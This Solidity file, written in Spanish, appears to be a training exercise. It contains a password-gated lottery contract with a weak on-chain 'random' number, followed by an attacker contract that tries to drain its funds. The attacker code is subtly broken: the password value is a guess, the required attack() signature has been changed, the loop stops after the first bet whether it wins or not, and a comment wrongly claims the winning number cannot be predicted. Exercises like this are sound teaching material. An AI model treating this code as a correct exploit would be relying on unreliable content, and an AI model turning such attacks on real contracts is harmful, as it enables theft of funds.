// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/**
 * El contrato LoteriaConPassword permite que las personas participen en una lotería
 * Sin embargo, solo permite participar a aquellas personas que "conocen" el password
 *
 * Para poder participar, una persona provee tres elementos:
 * 1. El password
 * 2. Un número (preddicción) de un número entero (uint256)
 * 3. Una cantidad de 1500 o 1500 wei
 *
 * De acuerdo a los tests, el contrato LoteriaConPassword comienza con un balance de 1500 wei o 1500
 * El objetivo es drenar los fondos del contrato LoteriaConPassword
 *
 * Para ello se desarrollará el contrato AttackerLoteria
 * El contrato AttackerLoteria ejecutará el método attack()
 * Al hacerlo, participará en la lotería:
 * - apostando 1500 wei o 1500 (según el require de LoteriaConPassword)
 * - "adivinando" el número ganador
 * - "conociendo" el password
 *
 * La operación termina cuando el contrato AttackerLoteria gana la lotería
 *
 * Nota:
 * - No cambiar la firma del método attack()
 * - Asumir que cuando attack() es llamado, el contrato AttackerLoteria posee un balance de Ether
 *
 * ejecuar el test con:
 * npx hardhat test test/EjercicioTesting_7.js
 */

contract LoteriaConPassword {
    constructor() payable {}

    uint256 public FACTOR =
        104312904618913870938864605146322161834075447075422067288548444976592725436353;

    function participarEnLoteria(
        uint8 password,
        uint256 _numeroGanador
    ) public payable {
        require(msg.value == 1500, "Cantidad apuesta incorrecta");
        require(
            uint256(keccak256(abi.encodePacked(password))) == FACTOR,
            "No es el hash correcto"
        );

        uint256 numRandom = uint256(
            keccak256(
                abi.encodePacked(
                    FACTOR,
                    msg.value,
                    tx.origin,
                    block.timestamp,
                    msg.sender
                )
            )
        );

        uint256 numeroGanador = numRandom % 10;

        if (numeroGanador == _numeroGanador) {
            payable(msg.sender).transfer(msg.value * 2);
        }
    }
}

// contract AttackerLoteria {
//     function attack(address _sc) public payable {}
// }

interface ILoteriaConPassword {
    function participarEnLoteria(uint8 password, uint256 numeroGanador) external payable;
}

contract AttackerLoteria {
    ILoteriaConPassword public loteria;
    uint8 private constant PASSWORD = 1; // Asegúrate de que este es el password que hace que el hash coincida con FACTOR.

    // Constructor para inicializar la dirección de LoteriaConPassword
    constructor(address _loteriaAddress) {
        loteria = ILoteriaConPassword(_loteriaAddress);
    }

    function attack() public payable {
        require(msg.value >= 1500, "Insufficient funds for the attack");

        // Asumir que tenemos alguna forma de predecir o ajustar el número ganador, si es posible
        // Este loop es más una formalidad ya que el número ganador es difícil de predecir sin conocer el estado exacto del bloque
        for (uint256 i = 0; i < 10; i++) {
            try loteria.participarEnLoteria{value: 1500}(PASSWORD, i) {
                // Si una transacción es exitosa y el contrato gana, rompe el bucle
                break;
            } catch {
                // Si la transacción falla, intenta con el siguiente número
                continue;
            }
        }
    }

    // Función para recibir ether, necesaria para recibir premios de la lotería
    receive() external payable {}
}